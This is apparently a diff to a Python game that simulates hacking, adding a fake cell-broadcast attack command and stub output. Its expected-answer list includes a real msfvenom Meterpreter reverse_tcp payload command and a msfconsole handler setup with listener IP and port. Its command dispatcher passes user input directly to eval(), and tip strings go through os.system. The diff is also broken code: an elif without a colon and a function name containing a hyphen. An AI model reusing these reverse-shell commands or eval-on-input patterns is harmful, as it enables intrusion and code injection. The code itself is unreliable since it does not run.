@@ -1,5 +1,6 @@
 from random import *
 import os
+import requests
 
 def semStep(step: int):
 	semStep = [0,2,2,1,2,3,0]
@@ -98,11 +99,16 @@ Console options:
 	elif src=='get-cam':
 		return '''Usage of Get-Cam
 get-cam --ip asdf --port asdf --sys windows10/64 --hw samsung'''
+	elif src=='cellbroad-attack'
+		return '''Usage: cellbroad-attack [URL]
+Example: cellbroad-attack http://sv.m03.pw/video/03.mp4'''
 	else:
 		return 'NO'
 
 def msfvenom(src: str):
+	src = ' '.join(src)
 	if src=='-p windows/meterpreter/reverse_tcp LHOST=144.13.135.13 LPORT=2031 -f exe > back.exe':
+		print('File Created')
 		f = open('hack.exe', 'w')
 		f.write('KeKeKe')
 		f.close()
@@ -118,6 +124,14 @@ lhost => 144.168.0.22
 lport => 2031
 ExitONsession => false'''
 
+def cellbroad-attack(src: str):
+	num = src[0]
+	del(src[0])
+	src = ' '.join(src)
+	return f'''[*] Broadcasting SMS Signal to cell system
+[*] Sending message {src} to Near Signal
+[*] CBS Initalizing'''
+
 def result(cmd: str):
 	flag = cmd.split(' ')
 	app = flag[0]
@@ -125,6 +139,7 @@ def result(cmd: str):
 	if not app in globals().keys():
 		result = 'Unknown Command. Check if installed or spelling.\n<ERROR Code:0xE3A4 Reg:'+app+'></ERROR>\n'
 	else:
+		print(app + f'({flag})')
 		result = eval(app+f'({flag})')
 	return(result)
 
@@ -158,15 +173,18 @@ def newTip(step: int, count: int):
 		os.system(newTip.replace('sys:run ',''))
 	return newTip
 
-def isCorrect(cmd: str, step: int, count: int):
+def isCorrect(cmd: str, step: int, count: int, windows=None):
 	print(cmd, step, count)
 	lis = ['',
 	['ipconfig','144.13.135.13'],
 	['man msfvenom','openvideo'],
 	['msfvenom -p windows/meterpreter/reverse_tcp LHOST=144.13.135.13 LPORT=2031 -f exe > back.exe'],
 	['man msfconsole', 'openvideo'],
-	['msf use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set LHOST=144.168.0.22 set LPORT=2031 set ExitONsession false','man getcam','get-cam --ip asdf --port asdf --sys windows10/64 --hw samsung']
+	['msf use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set LHOST=144.168.0.22 set LPORT=2031 set ExitONsession false','man getcam','get-cam --ip asdf --port asdf --sys windows10/64 --hw samsung'],
+	['cellbroad-attack']
 	]
+	if windows != None:
+		windows.mainText.append(lis[step][count])
 	if lis[step][count] == cmd:
 		print(True)
 		return True
